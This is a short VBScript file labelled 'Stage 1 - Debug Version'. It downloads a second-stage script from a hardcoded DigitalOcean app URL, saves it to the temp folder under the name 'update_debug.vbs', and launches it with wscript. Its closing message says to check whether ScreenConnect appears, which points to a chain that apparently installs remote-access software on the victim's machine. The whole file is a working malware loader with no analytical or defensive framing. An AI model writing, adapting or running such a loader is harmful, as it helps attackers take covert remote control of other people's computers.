' Stage 1 - Debug Version (Hardcoded URL)

On Error Resume Next

Dim objShell, objFSO, http, stream, stage2, tempFile

WScript.Echo "[1] Script started"

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

stage2 = "https://walrus-app-f8pss.ondigitalocean.app/stage2.php"
WScript.Echo "[2] Stage 2 URL: " & stage2

tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\update_debug.vbs"
WScript.Echo "[3] Temp file: " & tempFile

WScript.Echo "[4] Downloading Stage 2..."
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", stage2, False
http.Send

WScript.Echo "[5] HTTP Status: " & http.Status

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile tempFile, 2
    stream.Close
    WScript.Echo "[6] Download successful"

    WScript.Echo "[7] Launching Stage 2..."
    objShell.Run "wscript.exe """ & tempFile & """", 1, False
    WScript.Echo "[8] Stage 2 launched"
Else
    WScript.Echo "[ERROR] Download failed"
End If

WScript.Echo "[DONE] Check if ScreenConnect appears"
WScript.Quit
